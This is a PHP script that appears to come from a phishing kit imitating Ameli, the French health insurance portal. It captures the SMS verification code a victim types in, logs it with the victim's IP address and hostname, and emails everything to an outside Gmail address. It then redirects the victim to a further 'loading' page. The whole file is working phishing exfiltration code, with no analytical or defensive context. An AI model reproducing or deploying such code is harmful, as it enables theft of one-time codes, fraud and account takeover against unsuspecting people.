<?php
$ip = getenv("REMOTE_ADDR");
$url = base64_decode($_GET['url']);
$back = "loading2.php" ;
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~~~~~~~\n";
$message .= "SMS : ".$_POST['o8']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "~~~~~~~ ok ~~~~~~~\n";
fwrite($file, "\n".$message);
fclose($file);

$send = "450cc913@gmail.com";
$subject = "sms ameli 1 | $ip ";
$headers = "From:<localhost>";
mail($send,$subject,$message,$headers);
header("Location: $back");
 
?>